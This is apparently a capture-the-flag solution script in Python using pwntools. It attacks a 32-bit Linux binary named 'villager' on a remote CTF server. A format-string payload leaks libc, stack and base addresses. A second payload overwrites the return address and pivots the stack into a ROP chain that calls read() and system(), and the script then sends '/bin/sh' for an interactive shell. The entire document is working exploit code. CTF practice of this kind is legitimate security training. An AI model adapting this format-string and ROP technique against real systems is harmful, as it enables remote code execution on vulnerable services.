#!/usr/bin/env python
# coding: utf-8
from pwn import *
from libformatstr import FormatStr

context(os="linux", arch="i386")


def main():
    # conn = process("./villager")
    conn = remote("ctfq.sweetduet.info", 10001)
    # conn = remote("localhost", 3000)
    # libc = ELF("/lib/i386-linux-gnu/libc-2.23.so")  # gdb
    # libc = ELF("/lib/i386-linux-gnu/libc.so.6")  # local
    libc = ELF("./libc.so.6")  # remote
    p = FormatStr(autosort=False)

    conn.recvuntil("What's your name?")

# first payload
    payload = "%91$p %78$p %79$p"  # __libc_start_main+247, return_addr-4, main+65
    # payload = "%83$p %78$p %79$p"  # __cxa_atexit+27, return_addr-4, main+65
    # payload = "%34$p %78$p %79$p"  # _IO_file_overflow+12, return_addr-4, main+65
    conn.sendline(payload)

    conn.recvuntil("\n")
    recv = conn.recvuntil("\n")
    tmp = recv.rstrip().split(" ")

    libc_leak = tmp[1]
    # libc_base = int(libc_leak, 16) - 247 - libc.symbols["__libc_start_main"]
    libc_base = int(libc_leak, 16) - 230 - libc.symbols["__libc_start_main"]
    # libc_base = int(libc_leak, 16) - 27 - libc.symbols["__cxa_atexit"]
    # libc_base = int(libc_leak, 16) - 9 - libc.symbols["_IO_file_doallocate"]

    stack_eip_leak = tmp[2]
    stack_eip_addr = int(stack_eip_leak, 16) - 0x2c
    stack_esp_addr = stack_eip_addr + 4
    esp_addr = stack_eip_addr - 0xb8  # this is the place of input

    base_leak = tmp[3]
    base_addr = int(base_leak, 16) - 65 - 0x8b0  # 0x8b0 is offset of "main"
    # pop_eax_ret = libc_base + 0x2406e  # local
    pop_eax_ret = libc_base + 0x2292c  # remote
    # xchg_eax_esp_ret = libc_base + 0x18ea7  # local
    xchg_eax_esp_ret = libc_base + 0x10b939  # remote
    buffer_addr = stack_eip_addr - 0x3c
    pop3_ret = base_addr + 0x79d

    system_addr = libc_base + libc.symbols["system"]
    read_addr = libc_base + libc.symbols["read"]

    print "libc_base: " + str(hex(libc_base))
    print "base_addr: " + str(hex(base_addr))
    print "stack_eip_leak: " + str(stack_eip_leak)
    print "stack_eip_addr: " + str(hex(stack_eip_addr))
    print "system: " + str(hex(system_addr))

    conn.recvuntil("What's your name?")

# second payload
    # p[0xffffbc2c] = pop_eax_ret
    p[stack_eip_addr] = pop_eax_ret
    # p[stack_eip_addr] = base_addr + 0x8b0  # 上手く動いている

    # p[0xffffbc30] = 0xffffbb0c + 0x68  # esp
    p[stack_esp_addr] = esp_addr  # esp
    # p[0xffffbc34] = xchg_eax_esp_ret
    p[stack_esp_addr + 4] = xchg_eax_esp_ret

    payload = p.payload(7, start_len=0)  # 11 is (already printed(4byte)) + (place of buffer(7))
    payload += p32(read_addr)
    # payload += p32(base_addr + 0x8f1)  # return addr  # 0x8f1だと変なチェックが入っていてループに入ってくれない
    # payload += p32(0xffffbb0c + 0x9c)  # return addr  <- これだとここに格納されている4バイトが命令として扱われてしまうので、直接ropgadgetのアドレスを書いておけばおｋ
    payload += p32(pop3_ret)  # return addr
    payload += p32(0x1)  # stdin
    payload += p32(buffer_addr)  # buffer
    # payload += p32(0xffffbc10)  # buffer
    payload += p32(0x17)  # size
    payload += p32(system_addr)
    payload += p32(0xdeadbeef)  # return addr, esp
    # payload += p32(base_addr + 0x8b0)  # return addr, esp
    payload += p32(buffer_addr)  # buffer
    payload += "\x00"
    print payload

    conn.send(payload)
    conn.sendline("/bin/sh" + "\x00")
    conn.interactive()


if __name__ == "__main__":
    main()
